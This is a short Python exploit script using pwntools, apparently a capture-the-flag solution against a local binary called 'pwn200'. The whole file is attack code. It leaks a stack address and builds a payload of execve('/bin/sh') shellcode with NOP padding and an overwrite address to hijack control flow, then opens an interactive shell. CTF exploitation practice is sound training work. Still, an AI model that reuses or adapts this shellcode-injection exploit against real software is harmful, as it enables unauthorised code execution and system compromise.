#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
context(arch = 'amd64', os = 'linux', log_level = 'debug')

io = process("./pwn200")
io.sendafter("?\n", '0' * 48)
rbpAddr = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00'))
success("rbpAddr -> {:#x}".format(rbpAddr))

#  raw_input("DEBUG: ")
#  gdb.attach(io)
io.sendlineafter("?\n", "0")
payload = p64(rbpAddr - 0xb8) + asm(shellcraft.execve("/bin/sh"))
payload = payload.ljust(0x40 - 8, '\x90')
payload += p64(0x0000000000602030)
io.sendafter("~\n", payload)

io.interactive()
io.close()
